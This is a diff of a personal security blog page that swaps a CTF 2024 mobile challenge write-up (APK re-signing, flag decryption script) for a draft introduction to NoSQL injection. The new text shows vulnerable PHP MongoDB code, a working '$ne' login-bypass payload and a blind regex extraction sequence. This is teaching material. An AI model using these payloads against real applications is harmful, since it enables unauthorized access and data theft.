@@ -9,14 +9,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>1337UP (2024) &middot; &gt;_ majix.site</title>
-  <meta name="title" content="1337UP (2024) &middot; &gt;_ majix.site" />
+  <title>NoSQL Injection Attacks &middot; &gt;_ majix.site</title>
+  <meta name="title" content="NoSQL Injection Attacks &middot; &gt;_ majix.site" />
   
-  <meta name="description" content="1337UP CTF 2024 - Majix" />
+  <meta name="description" content="Introduction into NoSQL Injection Attacks" />
   
   
   
-  <link rel="canonical" href="http://localhost:1313/ctfs/1337up-2024/" />
+  <link rel="canonical" href="http://localhost:1313/posts/nosql/" />
   
   
   
@@ -70,35 +70,35 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/ctfs/1337up-2024/">
+  <meta property="og:url" content="http://localhost:1313/posts/nosql/">
   <meta property="og:site_name" content="&gt;_ majix.site">
-  <meta property="og:title" content="1337UP (2024)">
-  <meta property="og:description" content="1337UP CTF 2024 - Majix">
+  <meta property="og:title" content="NoSQL Injection Attacks">
+  <meta property="og:description" content="Introduction into NoSQL Injection Attacks">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
-    <meta property="article:section" content="ctfs">
+    <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-02-17T00:00:00+00:00">
     <meta property="article:modified_time" content="2025-02-17T00:00:00+00:00">
-    <meta property="og:image" content="http://localhost:1313/ctfs/1337up-2024/feature.webp">
+    <meta property="og:image" content="http://localhost:1313/posts/nosql/feature.webp">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/ctfs/1337up-2024/feature.webp">
-  <meta name="twitter:title" content="1337UP (2024)">
-  <meta name="twitter:description" content="1337UP CTF 2024 - Majix">
+  <meta name="twitter:image" content="http://localhost:1313/posts/nosql/feature.webp">
+  <meta name="twitter:title" content="NoSQL Injection Attacks">
+  <meta name="twitter:description" content="Introduction into NoSQL Injection Attacks">
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Ctfs",
-    "name": "1337UP (2024)",
-    "headline": "1337UP (2024)",
-    "description": "1337UP CTF 2024 - Majix",
-    "abstract": "🏆 318\/1061 -- 700 Points Challange Type Points Finished Secure Bank Rev 100 November 16th, 11:55:09 PM BabyFlow Warmup 50 November 16th, 8:29:59 PM Rigged Slot Machine 1 Warmup 50 November 16th, 8:21:55 PM Trackdown 2 OSINT 100 November 15th, 8:09:06 PM Trackdown OSINT 100 November 15th, 7:49:05 PM Cold Storage Mobile 100 November 15th, 5:05:44 PM BioCorp Web 100 November 15th, 3:16:32 PM Pizza Paradise Web 100 November 15th, 2:46:25 PM Writeups #\rCold Storage 🐈 #\rThe Initial Roadblock: APK Installation Blues Like any eager hacker starting a mobile challenge, I dove straight in trying to install the APK.",
+    "articleSection": "Posts",
+    "name": "NoSQL Injection Attacks",
+    "headline": "NoSQL Injection Attacks",
+    "description": "Introduction into NoSQL Injection Attacks",
+    "abstract": "Overview #\rNoSQL databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases.",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/ctfs\/1337up-2024\/",
+    "url" : "http:\/\/localhost:1313\/posts\/nosql\/",
     "author" : {
       "@type": "Person",
       "name": "Max"
@@ -112,7 +112,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "674"
+    "wordCount": "437"
   }]
   </script>
 
@@ -462,7 +462,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/ctfs/1337up-2024/feature.webp);">
+    style="background-image:url(/posts/nosql/feature.webp);">
     
 
 
@@ -506,8 +506,8 @@
   <li class="inline ">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/ctfs/"
-      >Ctfs</a
+      href="/posts/"
+      >Posts</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -515,8 +515,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/ctfs/1337up-2024/"
-      >1337UP (2024)</a
+      href="/posts/nosql/"
+      >NoSQL Injection Attacks</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -525,7 +525,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      1337UP (2024)
+      NoSQL Injection Attacks
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -568,10 +568,16 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
   
 
   
+  
+  <span class="pl-2"><span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Draft
+  </span>
+</span></span>
   
 </div>
 
@@ -620,9 +626,15 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#writeups">Writeups</a>
+    <li><a href="#i-classfa-solid-fa-syringei-overview"><i class="fa-solid fa-syringe"></i> Overview</a></li>
+    <li><a href="#i-classfa-solid-fa-compassi-types-of-nosql-injection"><i class="fa-solid fa-compass"></i> Types of NoSQL Injection</a>
       <ul>
-        <li><a href="#cold-storage-">Cold Storage 🐈</a></li>
+        <li><a href="#in-band-injection">In-Band Injection</a></li>
+        <li><a href="#blind-injection">Blind Injection</a>
+          <ul>
+            <li><a href="#boolean-based">Boolean-Based</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -638,9 +650,15 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#writeups">Writeups</a>
+    <li><a href="#i-classfa-solid-fa-syringei-overview"><i class="fa-solid fa-syringe"></i> Overview</a></li>
+    <li><a href="#i-classfa-solid-fa-compassi-types-of-nosql-injection"><i class="fa-solid fa-compass"></i> Types of NoSQL Injection</a>
       <ul>
-        <li><a href="#cold-storage-">Cold Storage 🐈</a></li>
+        <li><a href="#in-band-injection">In-Band Injection</a></li>
+        <li><a href="#blind-injection">Blind Injection</a>
+          <ul>
+            <li><a href="#boolean-based">Boolean-Based</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -725,184 +743,119 @@
 
         <div class="article-content max-w-prose mb-20">
           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<h2>🏆  318/1061 -- 700 Points</h2>
-<table>
-<thead>
-<tr>
-<th><span class="text-primary-400"><strong>Challange</strong></span></th>
-<th><span class="text-primary-400">Type</span></th>
-<th><span class="text-primary-400">Points</span></th>
-<th><span class="text-primary-400">Finished</span></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Secure Bank</strong></td>
-<td>Rev</td>
-<td>100</td>
-<td>November 16th, 11:55:09 PM</td>
-</tr>
-<tr>
-<td><strong>BabyFlow</strong></td>
-<td>Warmup</td>
-<td>50</td>
-<td>November 16th, 8:29:59 PM</td>
-</tr>
-<tr>
-<td><strong>Rigged Slot Machine 1</strong></td>
-<td>Warmup</td>
-<td>50</td>
-<td>November 16th, 8:21:55 PM</td>
-</tr>
-<tr>
-<td><strong>Trackdown 2</strong></td>
-<td>OSINT</td>
-<td>100</td>
-<td>November 15th, 8:09:06 PM</td>
-</tr>
-<tr>
-<td><strong>Trackdown</strong></td>
-<td>OSINT</td>
-<td>100</td>
-<td>November 15th, 7:49:05 PM</td>
-</tr>
-<tr>
-<td><strong>Cold Storage</strong></td>
-<td>Mobile</td>
-<td>100</td>
-<td>November 15th, 5:05:44 PM</td>
-</tr>
-<tr>
-<td><strong>BioCorp</strong></td>
-<td>Web</td>
-<td>100</td>
-<td>November 15th, 3:16:32 PM</td>
-</tr>
-<tr>
-<td><strong>Pizza Paradise</strong></td>
-<td>Web</td>
-<td>100</td>
-<td>November 15th, 2:46:25 PM</td>
-</tr>
-</tbody>
-</table>
 
 
-<h2 class="relative group">Writeups 
-    <div id="writeups" class="anchor"></div>
+<h2 class="relative group"><i class="fa-solid fa-syringe"></i> Overview 
+    <div id="i-classfa-solid-fa-syringei-overview" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#writeups" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-syringei-overview" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
+<p><span class="text-primary-400">NoSQL</span> databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases. However, with this rise in adoption comes an increase in security vulnerabilities. NoSQL injection attacks occur when <span class="text-primary-400">untrusted user input is improperly handled and executed</span> within a NoSQL query, allowing an attacker to manipulate database operations. These vulnerabilities are <span class="text-primary-400">as dangerous as traditional SQL injections</span> but are often overlooked due to the misconception that NoSQL databases are inherently secure.</p>
 
 
-<h3 class="relative group">Cold Storage 🐈 
-    <div id="cold-storage-" class="anchor"></div>
+<h2 class="relative group"><i class="fa-solid fa-compass"></i> Types of NoSQL Injection 
+    <div id="i-classfa-solid-fa-compassi-types-of-nosql-injection" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#cold-storage-" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-compassi-types-of-nosql-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>NoSQL injection attacks can be categorized based on how the attacker interacts with the database and the feedback received. Understanding these types is crucial for both developers and security professionals to identify and mitigate potential threats.</p>
+
+
+<h3 class="relative group">In-Band Injection 
+    <div id="in-band-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#in-band-injection" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<hr>
-<h4>The Initial Roadblock: APK Installation Blues</h4>
-Like any eager hacker starting a mobile challenge, I dove straight in trying to install the APK. However, Android had other plans for my evening:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">adb</span> <span class="n">install</span> <span class="p">.\\</span><span class="n">cryptovault</span><span class="p">.</span><span class="py">apk</span>
+<p>In-Band Injection involves the attacker using the <span class="text-primary-400">same communication channel</span> to both launch the attack and gather results. This method is straightforward because the feedback is immediate.</p>
+<p><b class="text-primary-400">Example Scenario</b>: Consider a web application using MongoDB that accepts user login credentials via an HTTP <code>POST</code> request. The vulnerable PHP code might look like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Vulnerable PHP code
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$collection</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Performing</span> <span class="n">Streamed</span> <span class="n">Install</span>
-</span></span><span class="line"><span class="cl"><span class="n">adb</span><span class="err">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">install</span> <span class="p">.\\</span><span class="n">cryptovault</span><span class="p">.</span><span class="n">apk</span><span class="err">:</span> <span class="n">Failure</span> <span class="p">[</span><span class="n">INSTALL_PARSE_FAILED_NO_CERTIFICATES</span><span class="err">:</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">collect</span> <span class="n">certificates</span> <span class="n">from</span> <span class="p">/</span><span class="n">data</span><span class="p">/</span><span class="n">app</span><span class="p">/</span><span class="n">vmdl318868043</span><span class="p">.</span><span class="n">tmp</span><span class="p">/</span><span class="n">base</span><span class="p">.</span><span class="n">apk</span><span class="err">:</span> <span class="n">Attempt</span> <span class="n">to</span> <span class="n">get</span> <span class="n">length</span> <span class="n">of</span> <span class="n">null</span> <span class="n">array</span><span class="p">]</span>
-</span></span></code></pre></div><p>Ah yes, the classic &ldquo;where&rsquo;s your signature, buddy?&rdquo; error. Android, being the responsible platform it is, refuses to run applications without proper signing. It&rsquo;s like trying to enter a fancy restaurant without a tie – you&rsquo;ve got to dress the part!</p>
-<h4>Making Our APK Presentable</h4>
-First things first, we need the Android SDK build tools. Adding them to PATH:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\\</span>Users<span class="se">\\</span>&lt;USER&gt;<span class="se">\\</span>AppData<span class="se">\\</span>Local<span class="se">\\</span>Android<span class="se">\\</span>Sdk<span class="se">\\</span>build-tools<span class="se">\\</span>34.0.0
-</span></span></code></pre></div><h4>The Great Decompilation Adventure</h4>
-<p>While we could jump straight to signing the APK, experience has taught us that we&rsquo;ll need to decompile it anyway for our investigation. So why not kill two birds with one stone?</p>
-<p>Time to crack open this APK like a digital coconut using apktool. For those unfamiliar with apktool, it&rsquo;s like having X-ray vision for Android apps - it lets us peek inside and see what makes them tick!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apktool d .<span class="se">\\</span>cryptovault.apk
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> cryptovaul
-</span></span></code></pre></div><ul>
-<li><code>smali</code> files (Android&rsquo;s equivalent of assembly code - as fun to read as ancient hieroglyphics!)</li>
-<li>Resource files in <code>res/</code></li>
-<li>The holy grail of Android app analysis: <code>AndroidManifest.xml</code></li>
-</ul>
-<h4>Creating Our Own VIP Pass</h4>
-Since we can't get in without proper credentials, let's make some! We'll create a signing key that would make any app proud:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">keytool -genkey -v -keystore research.keystore -alias research_key -keyalg RSA -keysize <span class="m">2048</span> -validity <span class="m">10000</span>
-</span></span></code></pre></div><h4>Making Everything Pretty (And Aligned)</h4>
-Modern Android is picky about its APKs being aligned properly. Think of it as straightening your tie before entering:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zipalign -p -f -v <span class="m">4</span> cryptovault.apk aligned.apk
-</span></span></code></pre></div><h4> The Final Touch: Signing Our Masterpiece</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apksigner sign --ks ./research.keystore ./aligned.apk
-</span></span></code></pre></div><p>And voilà! We now have an APK that Android will welcome with open arms.</p>
-<h4>Down the Rabbit Hole: Application Analysis 🕵️‍♂️</h4>
-You can also drag-and-drop the APK directly into the emulator if you're feeling fancy.
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">adb</span> <span class="n">install</span> <span class="n">aligned</span><span class="p">.</span><span class="py">apk</span>
-</span></span></code></pre></div>
-<figure>
-      <img class="my-0 rounded-md full" src="/images/ctfs/1337UP2024/vault.webp" alt="Description of the image" />
-  
-  
-  </figure>
-<h4>AndroidManifest.xml</h4>
-<blockquote>
-<p><a href="https://github.com/skylot/jadx" target="_blank">https://github.com/skylot/jadx</a></p>
-</blockquote>
-<p>Diving into the manifest, we find something interesting - or rather, the lack of something interesting. Just one lonely permission:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.INTERNET&#34;</span><span class="nt">/&gt;</span>
-</span></span></code></pre></div><p>At least our cat friend can browse cat memes while guarding the vault!</p>
-<p>The manifest revealed a surprisingly minimalist activity structure:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">activity</span> <span class="n">android</span><span class="err">:</span><span class="n">name</span><span class="p">=</span><span class="s2">&#34;com.example.cryptoVault.MainActivity&#34;</span><span class="p">&gt;</span> <span class="p">[..]</span> <span class="p">&lt;/</span><span class="n">activity</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h4>Web Assets: Where the Magic Happens</h4>
-The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discovered the unlockVault() function, which revealed our feline friend's secret: PIN `7331`.
-<blockquote>
-<p>It spells ‘1337’, but backwards.. wow!</p>
-</blockquote>
-<p>After entering the correct PIN, we were rewarded with&hellip; another puzzle. An encrypted key. Because one layer of security is never enough!</p>
+</span></span><span class="line"><span class="cl"><span class="nv">$collection</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+</span></span></code></pre></div><p>An attacker can craft an HTTP request to exploit this unsanitized input:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl">username=admin&amp;password[$ne]=null</span></span></code></pre></div>
+<p><b class="text-primary-400">Explanation</b>: PHP Array Syntax &ndash; When writing MongoDB queries in PHP, arrays represent MongoDB’s query structure. The syntax <code>password[$ne]=null</code> translates to an associative array in PHP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;$ne&#39;</span> <span class="o">=&gt;</span> <span class="k">null</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">];</span>
+</span></span></code></pre></div><p>Resulting Query:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">findOne</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">password</span><span class="o">:</span> <span class="p">{</span> <span class="s2">&#34;</span><span class="si">$ne</span><span class="s2">&#34;</span><span class="o">:</span> <span class="k">null</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Since the password is <span class="text-primary-400">not null</span>, the condition is <span class="text-primary-400">true</span>, and the attacker gains unauthorized access as the admin.</p>
 
-<figure>
-      <img class="my-0 rounded-md full" src="/images/ctfs/1337UP2024/key.webp" alt="Description of the image" />
-  
-  
-  </figure>
-<h4>The Final Boss: Key Decryption 🔐</h4>
-<p>The encryption scheme was hidden in an obfuscated <code>keygen.js</code> file. After some quality time with a deobfuscator, we uncovered the encryption algorithm:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">affineEncrypt</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">multiplier</span><span class="p">,</span> <span class="nx">offset</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">multiplier</span> <span class="o">*</span> <span class="nx">value</span> <span class="o">+</span> <span class="nx">offset</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+
+<h3 class="relative group">Blind Injection 
+    <div id="blind-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#blind-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Blind Injections occur when an attacker <span class="text-primary-400">cannot see the direct results</span> of their injected queries but can <span class="text-primary-400">infer information based on the application’s responses</span>, such as differences in content, HTTP status codes, error messages, or response times.</p>
+
+
+<h4 class="relative group">Boolean-Based 
+    <div id="boolean-based" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#boolean-based" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>In a <span class="text-primary-400">Boolean-Based Blind Injection</span>, the attacker sends <span class="text-primary-400">queries that evaluate to either true or false</span> and observes the application’s behavior to infer information about the database.</p>
+<p><b class="text-primary-400">Example Scenario</b>: Consider a search functionality with a NoSQL Injection vulnerability, where users can search for products. An attacker sends a request with a crafted search term:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/search.php?search[$regex]=^S.*</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span></code></pre></div><p>If a product starting with the letter “<span class="text-primary-400">S</span>” exists:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">xor</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">a</span> <span class="o">^</span> <span class="nx">b</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line hl"><span class="cl">  Exists: true
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div>
+<p>Otherwise:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">...</span>
-</span></span></code></pre></div><p>Rather than trying to understand the entire obfuscated mess (life&rsquo;s too short!), <del>Myself</del> ChatGPT wrote a Python script to reverse the operations and retrieve the flag:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">affine_decrypt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">multiplier</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="p">(</span><span class="n">value</span> <span class="o">-</span> <span class="n">offset</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># The encrypted treasure map</span>
-</span></span><span class="line"><span class="cl"><span class="n">encrypted_key_hex</span> <span class="o">=</span> <span class="s2">&#34;abf6c8abb5daabc8ab69d7846def17b19c6dae843a6dd7e1b1173ae16db184e0b86dd7c5843ae8dee15f&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">encrypted_key_bytes</span> <span class="o">=</span> <span class="n">hex_to_bytes</span><span class="p">(</span><span class="n">encrypted_key_hex</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Magic numbers (because every good crypto needs magic numbers)</span>
-</span></span><span class="line"><span class="cl"><span class="n">multiplier</span> <span class="o">=</span> <span class="mi">9</span>
-</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">7</span>
-</span></span><span class="line"><span class="cl"><span class="n">xor_key</span> <span class="o">=</span> <span class="mi">51</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Let the decryption begin!</span>
-</span></span><span class="line"><span class="cl"><span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="p">[</span>
-</span></span><span class="line"><span class="cl">    <span class="n">affine_decrypt</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">),</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">encrypted_key_bytes</span>
-</span></span><span class="line"><span class="cl"><span class="p">]</span>
-</span></span></code></pre></div>
+</span></span><span class="line hl"><span class="cl">No products found.</span></span></code></pre></div>
+<p>To extract the full name of the product, the attacker continues testing each subsequent character to reconstruct the produc name:</p>
+<pre tabindex="0"><code>search[$regex]=^Se.*  ✔️
+search[$regex]=^Sea.* ✖️
+search[$regex]=^Sec.* ✔️
+…
+search[$regex]=^SecretProduct$
+</code></pre>
           
           
           
@@ -918,6 +871,86 @@ The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discover
 
 <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
 <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/ctfs/1337up-2024/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/ctfs/1337up-2024/feature.webp);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/ctfs/1337up-2024/">1337UP (2024)</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
   
   
 
@@ -1180,8 +1213,8 @@ The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discover
           
         
       <script>
-        var oid = "views_ctfs\/1337UP-2024\/index.md"
-        var oid_likes = "likes_ctfs\/1337UP-2024\/index.md"
+        var oid = "views_posts\/noSQL\/index.md"
